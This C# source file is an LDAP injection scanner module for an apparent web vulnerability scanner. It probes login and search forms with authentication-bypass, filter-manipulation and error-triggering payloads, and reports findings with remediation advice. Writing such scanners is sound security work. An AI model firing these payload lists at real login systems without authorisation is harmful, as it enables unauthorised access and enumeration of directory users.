using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web;
using Raqeeb.Domain.Entities;
using Raqeeb.Domain.Interfaces;
using Raqeeb.Domain.Scanning;

namespace Raqeeb.Infrastructure.Scanning.Modules;

/// <summary>
/// Detects LDAP (Lightweight Directory Access Protocol) injection vulnerabilities
/// where user input is incorporated into LDAP queries without proper sanitization.
/// Common targets: authentication systems using Active Directory, OpenLDAP, etc.
/// Techniques: authentication bypass, wildcard injection, AND/OR manipulation,
/// error-based disclosure, blind enumeration.
/// </summary>
public class LdapInjectionScanner : IScannerModule
{
    public string Name => "LdapInjectionScanner";
    public string Description => "Detects LDAP injection via authentication bypass, wildcard injection, operator manipulation, and error-based/blind techniques.";

    // ── Login form patterns ─────────────────────────────────────────────────
    private static readonly Regex LoginFormPattern = new(
        @"<form[^>]*(?:login|signin|auth)[^>]*>",
        RegexOptions.IgnoreCase | RegexOptions.Compiled);

    private static readonly Regex UsernameFieldPattern = new(
        @"<input[^>]*name=['""]?(username|user|login|email|uid)['""]?[^>]*>",
        RegexOptions.IgnoreCase | RegexOptions.Compiled);

    private static readonly Regex PasswordFieldPattern = new(
        @"<input[^>]*type=['""]?password['""]?[^>]*name=['""]?([^'"">\s]+)['""]?[^>]*>",
        RegexOptions.IgnoreCase | RegexOptions.Compiled);

    // ── LDAP authentication bypass payloads ─────────────────────────────────
    // These payloads manipulate LDAP filter syntax to bypass authentication
    private static readonly string[] AuthBypassPayloads =
    [
        "*",                           // Wildcard - matches any value
        "*)(uid=*",                    // Closes filter, injects new condition
        "*)(uid=*))(|(uid=*",          // OR injection
        "*)(|(uid=*",                  // OR with wildcard
        "admin)(&(password=*",         // AND injection with known username
        "admin)(&))",                  // Closes filter prematurely
        "admin)(|(&",                  // Mixed operators
        "*))%00",                      // Null-byte injection
        "*()|&'",                      // Special chars
        "*)(&(objectClass=*",          // ObjectClass injection
        "*)(objectClass=*",
        "*)(cn=*",                     // Common Name wildcard
        "admin*",                      // Partial match with wildcard
        "a*",                          // Short wildcard
        "*admin*",                     // Contains match
        "\\2a",                        // Escaped asterisk (bypass filters)
        "\\28",                        // Escaped parenthesis
        "\\29",                        // Escaped closing parenthesis
    ];

    // ── LDAP filter manipulation payloads ───────────────────────────────────
    private static readonly string[] FilterManipulationPayloads =
    [
        "*)(&(password=*",             // Password wildcard
        "admin)(&(|(password=*",       // Complex OR
        "admin)(!(&(uid=*",            // NOT operator
        "admin)(uid=*))(&(uid=*",      // Multiple conditions
        "*)(uid=pwd))",                // Attribute injection
        "*)(userPassword=*",           // Direct password attribute
        "*)(cn=users",                 // Group enumeration
        "*)(description=*",            // Metadata disclosure
        "*)(mail=*",                   // Email enumeration
    ];

    // ── LDAP error message patterns ─────────────────────────────────────────
    private static readonly string[] LdapErrorPatterns =
    [
        "ldap",
        "ldap_",
        "javax.naming",
        "invalid dn syntax",
        "ldap: error code",
        "dsid-",
        "ldap filter",
        "directory",
        "active directory",
        "ldap search failed",
        "bad search filter",
        "invalid search filter",
        "ldapsearchexception",
        "javax.naming.directory",
        "com.sun.jndi",
        "ldap error",
        "naming exception",
    ];

    // ── Common username/password field names ────────────────────────────────
    private static readonly string[] UsernameFieldNames =
    [
        "username", "user", "login", "email", "uid", "userId",
        "user_name", "loginId", "account", "userName"
    ];

    private static readonly string[] PasswordFieldNames =
    [
        "password", "pass", "pwd", "passwd", "user_password"
    ];

    // ════════════════════════════════════════════════════════════════════════
    //  Entry point
    // ════════════════════════════════════════════════════════════════════════

    public async Task<IEnumerable<Vulnerability>> ScanAsync(ScanContext context)
    {
        var vulnerabilities = new List<Vulnerability>();

        try
        {
            // 1. Discover login forms
            var loginEndpoints = await DiscoverLoginFormsAsync(context);

            if (loginEndpoints.Count == 0)
            {
                // No login forms found - also test common auth endpoints
                loginEndpoints = ProbeCommonAuthEndpoints(context);
            }

            // 2. Test authentication bypass via LDAP injection
            var bypassVulns = await TestAuthenticationBypassAsync(context, loginEndpoints);
            vulnerabilities.AddRange(bypassVulns);

            // 3. Test error-based LDAP injection
            var errorVulns = await TestErrorBasedLdapInjectionAsync(context, loginEndpoints);
            vulnerabilities.AddRange(errorVulns);

            // 4. Test blind LDAP injection via response differential
            var blindVulns = await TestBlindLdapInjectionAsync(context, loginEndpoints);
            vulnerabilities.AddRange(blindVulns);

            // 5. Test search parameter LDAP injection
            var searchVulns = await TestSearchParameterInjectionAsync(context);
            vulnerabilities.AddRange(searchVulns);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"LDAP Injection Scanner error: {ex.Message}");
        }

        return vulnerabilities;
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Endpoint discovery
    // ════════════════════════════════════════════════════════════════════════

    private async Task<List<LoginEndpoint>> DiscoverLoginFormsAsync(ScanContext context)
    {
        var endpoints = new List<LoginEndpoint>();
        var allUrls = new List<string> { context.Target.Url };
        allUrls.AddRange(context.DiscoveredUrls);

        foreach (var url in allUrls.Where(u => 
            u.Contains("login", StringComparison.OrdinalIgnoreCase) ||
            u.Contains("signin", StringComparison.OrdinalIgnoreCase) ||
            u.Contains("auth", StringComparison.OrdinalIgnoreCase)).Take(10))
        {
            try
            {
                var response = await context.HttpClient.GetAsync(url);
                if (!response.IsSuccessStatusCode)
                    continue;

                var html = await response.Content.ReadAsStringAsync();

                // Check for login form
                if (!LoginFormPattern.IsMatch(html))
                    continue;

                // Extract username field
                var usernameMatch = UsernameFieldPattern.Match(html);
                var usernameField = usernameMatch.Success ? usernameMatch.Groups[1].Value : "username";

                // Extract password field
                var passwordMatch = PasswordFieldPattern.Match(html);
                var passwordField = passwordMatch.Success ? passwordMatch.Groups[1].Value : "password";

                // Extract form action
                var formActionMatch = Regex.Match(html, @"<form[^>]*action=['""]?([^'"">\s]+)['""]?", 
                    RegexOptions.IgnoreCase);
                
                string formAction;
                if (formActionMatch.Success && !string.IsNullOrEmpty(formActionMatch.Groups[1].Value))
                {
                    formAction = formActionMatch.Groups[1].Value;
                    
                    // Convert relative to absolute
                    if (!formAction.StartsWith("http", StringComparison.OrdinalIgnoreCase))
                    {
                        var baseUri = new Uri(url);
                        if (formAction.StartsWith('/'))
                        {
                            formAction = $"{baseUri.Scheme}://{baseUri.Authority}{formAction}";
                        }
                        else
                        {
                            var basePath = baseUri.AbsolutePath;
                            var lastSlash = basePath.LastIndexOf('/');
                            var directory = lastSlash > 0 ? basePath[..lastSlash] : "";
                            formAction = $"{baseUri.Scheme}://{baseUri.Authority}{directory}/{formAction}";
                        }
                    }
                }
                else
                {
                    formAction = url;
                }

                endpoints.Add(new LoginEndpoint
                {
                    Url = formAction,
                    UsernameField = usernameField,
                    PasswordField = passwordField
                });
            }
            catch
            {
                // Continue
            }
        }

        return endpoints;
    }

    private static List<LoginEndpoint> ProbeCommonAuthEndpoints(ScanContext context)
    {
        var uri = new Uri(context.Target.Url);
        var baseUrl = $"{uri.Scheme}://{uri.Authority}";

        return new List<LoginEndpoint>
        {
            new() { Url = $"{baseUrl}/login", UsernameField = "username", PasswordField = "password" },
            new() { Url = $"{baseUrl}/auth/login", UsernameField = "username", PasswordField = "password" },
            new() { Url = $"{baseUrl}/api/auth", UsernameField = "username", PasswordField = "password" },
            new() { Url = $"{baseUrl}/signin", UsernameField = "email", PasswordField = "password" },
        };
    }

    // ════════════════════════════════════════════════════════════════════════
    //  1. Authentication bypass
    // ════════════════════════════════════════════════════════════════════════

    private async Task<List<Vulnerability>> TestAuthenticationBypassAsync(
        ScanContext context, List<LoginEndpoint> endpoints)
    {
        var vulnerabilities = new List<Vulnerability>();

        foreach (var endpoint in endpoints.Take(5))
        {
            // First, establish baseline with invalid credentials
            string baselineContent;
            int baselineStatus;
            try
            {
                var baselineParams = new Dictionary<string, string>
                {
                    { endpoint.UsernameField, "invaliduser" },
                    { endpoint.PasswordField, "invalidpass" }
                };
                var baselineResponse = await PostFormAsync(context, endpoint.Url, baselineParams);
                baselineContent = await baselineResponse.Content.ReadAsStringAsync();
                baselineStatus = (int)baselineResponse.StatusCode;
            }
            catch
            {
                continue;
            }

            // Test authentication bypass payloads
            foreach (var payload in AuthBypassPayloads.Take(10))
            {
                try
                {
                    var testParams = new Dictionary<string, string>
                    {
                        { endpoint.UsernameField, payload },
                        { endpoint.PasswordField, payload }
                    };

                    var testResponse = await PostFormAsync(context, endpoint.Url, testParams);
                    var testContent = await testResponse.Content.ReadAsStringAsync();
                    var testStatus = (int)testResponse.StatusCode;

                    // Check for authentication bypass indicators
                    var bypassDetected = false;
                    string indicator = "";

                    // Indicator 1: Status code changed from 401/403 to 200/302
                    if ((baselineStatus is 401 or 403) && (testStatus is 200 or 302))
                    {
                        bypassDetected = true;
                        indicator = $"Status changed from {baselineStatus} to {testStatus}";
                    }

                    // Indicator 2: Redirect to dashboard/home (bypass)
                    if (testResponse.Headers.Location != null)
                    {
                        var location = testResponse.Headers.Location.ToString();
                        if (location.Contains("dashboard", StringComparison.OrdinalIgnoreCase) ||
                            location.Contains("home", StringComparison.OrdinalIgnoreCase) ||
                            location.Contains("profile", StringComparison.OrdinalIgnoreCase))
                        {
                            bypassDetected = true;
                            indicator = $"Redirected to: {location}";
                        }
                    }

                    // Indicator 3: Success message in response
                    if (testContent.Contains("welcome", StringComparison.OrdinalIgnoreCase) ||
                        testContent.Contains("logged in", StringComparison.OrdinalIgnoreCase) ||
                        testContent.Contains("login successful", StringComparison.OrdinalIgnoreCase) ||
                        (testContent.Contains("token", StringComparison.OrdinalIgnoreCase) && 
                         testContent.Contains("jwt", StringComparison.OrdinalIgnoreCase)))
                    {
                        bypassDetected = true;
                        indicator = "Response contains authentication success indicators";
                    }

                    // Indicator 4: Content significantly different from baseline (possible bypass)
                    if (Math.Abs(testContent.Length - baselineContent.Length) > baselineContent.Length * 0.3)
                    {
                        bypassDetected = true;
                        indicator = $"Response length changed significantly ({baselineContent.Length} → {testContent.Length} bytes)";
                    }

                    if (bypassDetected)
                    {
                        vulnerabilities.Add(new Vulnerability
                        {
                            Name = "LDAP Injection — Authentication Bypass",
                            Description = "The application is vulnerable to LDAP injection in the authentication mechanism. " +
                                          "By injecting LDAP filter metacharacters into the username or password field, " +
                                          "an attacker can manipulate the LDAP query to bypass authentication and gain " +
                                          "unauthorized access. This occurs when user input is directly concatenated into " +
                                          "LDAP search filters without proper escaping.",
                            Severity = Severity.Critical,
                            Evidence = $"Endpoint: {endpoint.Url}\n" +
                                       $"Username field: {endpoint.UsernameField}\n" +
                                       $"Payload: {payload}\n" +
                                       $"Bypass indicator: {indicator}\n" +
                                       $"Baseline status: {baselineStatus}\n" +
                                       $"Injected status: {testStatus}",
                            Remediation = "Use parameterized LDAP queries or escape all special characters in user input " +
                                          "before constructing LDAP filters. In .NET, use DirectorySearcher.Filter with " +
                                          "proper escaping. Never concatenate user input directly into LDAP search strings. " +
                                          "Escape these characters: *, (, ), \\, NUL, /. Implement proper authentication " +
                                          "logic that doesn't rely solely on LDAP query results.",
                            Url = endpoint.Url,
                            AffectedParameter = endpoint.UsernameField,
                            HttpRequest = $"POST {endpoint.Url} HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\n" +
                                          $"{endpoint.UsernameField}={HttpUtility.UrlEncode(payload)}&" +
                                          $"{endpoint.PasswordField}={HttpUtility.UrlEncode(payload)}",
                            HttpResponse = $"HTTP/1.1 {testStatus}\n{indicator}",
                            ModuleName = Name,
                            OwaspCategory = "A03:2021 - Injection",
                            CweId = "CWE-90",
                            CvssScore = "9.8",
                            References = "https://owasp.org/Top10/A03_2021-Injection/," +
                                         "https://cwe.mitre.org/data/definitions/90.html," +
                                         "https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html"
                        });

                        // One finding per endpoint
                        goto NextEndpoint;
                    }
                }
                catch
                {
                    // Continue
                }
            }

            NextEndpoint:;
        }

        return vulnerabilities;
    }

    // ════════════════════════════════════════════════════════════════════════
    //  2. Error-based LDAP injection
    // ════════════════════════════════════════════════════════════════════════

    private async Task<List<Vulnerability>> TestErrorBasedLdapInjectionAsync(
        ScanContext context, List<LoginEndpoint> endpoints)
    {
        var vulnerabilities = new List<Vulnerability>();

        // Payloads designed to break LDAP syntax and trigger errors
        string[] errorPayloads =
        [
            "*(",
            "*)(",
            "*))(",
            "*()|",
            "*())",
            "admin)(",
            "\\",
            "(",
            ")",
            ")))))))",
        ];

        foreach (var endpoint in endpoints.Take(5))
        {
            foreach (var payload in errorPayloads.Take(6))
            {
                try
                {
                    var testParams = new Dictionary<string, string>
                    {
                        { endpoint.UsernameField, payload },
                        { endpoint.PasswordField, "test123" }
                    };

                    var response = await PostFormAsync(context, endpoint.Url, testParams);
                    var content = await response.Content.ReadAsStringAsync();

                    // Check for LDAP error messages
                    foreach (var errorPattern in LdapErrorPatterns)
                    {
                        if (content.Contains(errorPattern, StringComparison.OrdinalIgnoreCase))
                        {
                            var snippet = ExtractErrorSnippet(content, errorPattern, 200);

                            vulnerabilities.Add(new Vulnerability
                            {
                                Name = "LDAP Injection — Error-Based Disclosure",
                                Description = "The application leaks LDAP error messages when invalid filter syntax is injected. " +
                                              "This confirms that user input is being incorporated into LDAP queries without " +
                                              "proper validation. While error disclosure alone may not enable authentication bypass, " +
                                              "it proves the existence of LDAP injection and can aid in crafting exploitation payloads.",
                                Severity = Severity.High,
                                Evidence = $"Endpoint: {endpoint.Url}\n" +
                                           $"Payload: {payload}\n" +
                                           $"Error pattern matched: {errorPattern}\n" +
                                           $"Error snippet:\n{snippet}",
                                Remediation = "1. Escape all user input before incorporating into LDAP filters. " +
                                              "2. Suppress detailed error messages in production. Return generic errors to users. " +
                                              "3. Log detailed errors server-side only. " +
                                              "4. Use parameterized LDAP queries where possible.",
                                Url = endpoint.Url,
                                AffectedParameter = endpoint.UsernameField,
                                HttpRequest = $"POST {endpoint.Url} HTTP/1.1\n{endpoint.UsernameField}={payload}",
                                HttpResponse = $"HTTP/1.1 {(int)response.StatusCode}\n{snippet}",
                                ModuleName = Name,
                                OwaspCategory = "A03:2021 - Injection",
                                CweId = "CWE-90",
                                CvssScore = "7.5",
                                References = "https://cwe.mitre.org/data/definitions/90.html," +
                                             "https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html"
                            });

                            goto NextEndpointError;
                        }
                    }
                }
                catch
                {
                    // Continue
                }
            }

            NextEndpointError:;
        }

        return vulnerabilities;
    }

    // ════════════════════════════════════════════════════════════════════════
    //  3. Blind LDAP injection (response differential)
    // ════════════════════════════════════════════════════════════════════════

    private async Task<List<Vulnerability>> TestBlindLdapInjectionAsync(
        ScanContext context, List<LoginEndpoint> endpoints)
    {
        var vulnerabilities = new List<Vulnerability>();

        foreach (var endpoint in endpoints.Take(3))
        {
            try
            {
                // Test 1: admin* (true condition - user starts with 'admin')
                var trueParams = new Dictionary<string, string>
                {
                    { endpoint.UsernameField, "admin*" },
                    { endpoint.PasswordField, "*" }
                };
                var trueResponse = await PostFormAsync(context, endpoint.Url, trueParams);
                var trueContent = await trueResponse.Content.ReadAsStringAsync();

                // Test 2: zzzzz* (false condition - unlikely user)
                var falseParams = new Dictionary<string, string>
                {
                    { endpoint.UsernameField, "zzzzz*" },
                    { endpoint.PasswordField, "*" }
                };
                var falseResponse = await PostFormAsync(context, endpoint.Url, falseParams);
                var falseContent = await falseResponse.Content.ReadAsStringAsync();

                // Compare responses
                if (Math.Abs(trueContent.Length - falseContent.Length) > 50)
                {
                    vulnerabilities.Add(new Vulnerability
                    {
                        Name = "LDAP Injection — Blind Injection (Response Differential)",
                        Description = "The application is vulnerable to blind LDAP injection. By injecting wildcard " +
                                      "characters and observing response differences, an attacker can enumerate valid " +
                                      "usernames and extract directory information bit-by-bit. The application returns " +
                                      "different responses based on whether the LDAP query matches existing users.",
                        Severity = Severity.Medium,
                        Evidence = $"Endpoint: {endpoint.Url}\n" +
                                   $"True condition payload: admin*\n" +
                                   $"True condition response length: {trueContent.Length} bytes\n" +
                                   $"False condition payload: zzzzz*\n" +
                                   $"False condition response length: {falseContent.Length} bytes\n" +
                                   $"Difference: {Math.Abs(trueContent.Length - falseContent.Length)} bytes",
                        Remediation = "Ensure consistent error responses regardless of whether users exist. " +
                                      "Use the same response for 'invalid username' and 'invalid password'. " +
                                      "Escape LDAP filter metacharacters. Implement rate limiting to prevent enumeration.",
                        Url = endpoint.Url,
                        AffectedParameter = endpoint.UsernameField,
                        HttpRequest = $"POST {endpoint.Url} HTTP/1.1\n{endpoint.UsernameField}=admin*",
                        HttpResponse = $"True: {trueContent.Length}B, False: {falseContent.Length}B",
                        ModuleName = Name,
                        OwaspCategory = "A03:2021 - Injection",
                        CweId = "CWE-90",
                        CvssScore = "5.3",
                        References = "https://cwe.mitre.org/data/definitions/90.html"
                    });

                    break;
                }
            }
            catch
            {
                // Continue
            }
        }

        return vulnerabilities;
    }

    // ════════════════════════════════════════════════════════════════════════
    //  4. Search parameter injection
    // ════════════════════════════════════════════════════════════════════════

    private async Task<List<Vulnerability>> TestSearchParameterInjectionAsync(ScanContext context)
    {
        var vulnerabilities = new List<Vulnerability>();

        // Look for search endpoints
        var searchUrls = context.DiscoveredUrls
            .Where(u => u.Contains("search", StringComparison.OrdinalIgnoreCase) ||
                        u.Contains("query", StringComparison.OrdinalIgnoreCase) ||
                        u.Contains("find", StringComparison.OrdinalIgnoreCase))
            .Take(5)
            .ToList();

        string[] searchParams = ["search", "q", "query", "name", "user", "filter"];

        foreach (var url in searchUrls)
        {
            foreach (var param in searchParams)
            {
                // Test wildcard injection
                var payload = "*";
                var separator = url.Contains('?') ? "&" : "?";
                var testUrl = $"{url}{separator}{param}={HttpUtility.UrlEncode(payload)}";

                try
                {
                    var response = await context.HttpClient.GetAsync(testUrl);
                    var content = await response.Content.ReadAsStringAsync();

                    // Check for LDAP errors or excessive data disclosure
                    foreach (var errorPattern in LdapErrorPatterns)
                    {
                        if (content.Contains(errorPattern, StringComparison.OrdinalIgnoreCase))
                        {
                            vulnerabilities.Add(new Vulnerability
                            {
                                Name = "LDAP Injection — Search Parameter",
                                Description = "The search functionality is vulnerable to LDAP injection. User-supplied " +
                                              "search terms are incorporated into LDAP queries without proper escaping. " +
                                              "An attacker can inject LDAP filter metacharacters to extract directory data.",
                                Severity = Severity.High,
                                Evidence = $"Search parameter: {param}\n" +
                                           $"Payload: {payload}\n" +
                                           $"LDAP error detected in response.",
                                Remediation = "Escape LDAP special characters in search input. Use allowlists for permitted " +
                                              "search fields. Implement proper access controls on directory searches.",
                                Url = testUrl,
                                AffectedParameter = param,
                                HttpRequest = $"GET {testUrl} HTTP/1.1",
                                HttpResponse = $"HTTP/1.1 {(int)response.StatusCode}\n[LDAP error detected]",
                                ModuleName = Name,
                                OwaspCategory = "A03:2021 - Injection",
                                CweId = "CWE-90",
                                CvssScore = "7.5",
                                References = "https://cwe.mitre.org/data/definitions/90.html"
                            });

                            goto NextSearchUrl;
                        }
                    }

                    // Check for excessive results (possible wildcard match)
                    if (response.IsSuccessStatusCode && content.Length > 10000)
                    {
                        var resultCount = Regex.Matches(content, @"<(tr|li|div)[^>]*>").Count;
                        if (resultCount > 20)
                        {
                            vulnerabilities.Add(new Vulnerability
                            {
                                Name = "LDAP Injection — Wildcard Data Disclosure",
                                Description = "The search functionality accepts wildcard characters (*) and returns all " +
                                              "matching directory entries without pagination or access control. This allows " +
                                              "an attacker to enumerate the entire directory.",
                                Severity = Severity.Medium,
                                Evidence = $"Search parameter: {param}\n" +
                                           $"Payload: {payload}\n" +
                                           $"Response size: {content.Length} bytes\n" +
                                           $"Estimated results: {resultCount}+",
                                Remediation = "Implement pagination. Restrict wildcard searches. Enforce access controls " +
                                              "on directory data. Limit the number of results returned.",
                                Url = testUrl,
                                AffectedParameter = param,
                                ModuleName = Name,
                                OwaspCategory = "A01:2021 - Broken Access Control",
                                CweId = "CWE-200",
                                CvssScore = "5.3",
                                References = "https://cwe.mitre.org/data/definitions/200.html"
                            });

                            goto NextSearchUrl;
                        }
                    }
                }
                catch
                {
                    // Continue
                }
            }

            NextSearchUrl:;
        }

        return vulnerabilities;
    }

    // ════════════════════════════════════════════════════════════════════════
    //  HTTP helpers
    // ════════════════════════════════════════════════════════════════════════

    private static async Task<HttpResponseMessage> PostFormAsync(
        ScanContext context, string url, Dictionary<string, string> formData)
    {
        using var content = new FormUrlEncodedContent(formData);
        return await context.HttpClient.PostAsync(url, content);
    }

    private static string ExtractErrorSnippet(string content, string marker, int maxLength)
    {
        if (string.IsNullOrEmpty(marker))
            return content.Length > maxLength ? content[..maxLength] + "..." : content;

        var idx = content.IndexOf(marker, StringComparison.OrdinalIgnoreCase);
        if (idx < 0)
            return content.Length > maxLength ? content[..maxLength] + "..." : content;

        var start = Math.Max(0, idx - 60);
        var end = Math.Min(content.Length, idx + marker.Length + 60);
        var snippet = content[start..end];

        return snippet.Length > maxLength ? snippet[..maxLength] + "..." : snippet;
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Data classes
    // ════════════════════════════════════════════════════════════════════════

    private class LoginEndpoint
    {
        public string Url { get; set; } = string.Empty;
        public string UsernameField { get; set; } = "username";
        public string PasswordField { get; set; } = "password";
    }
}
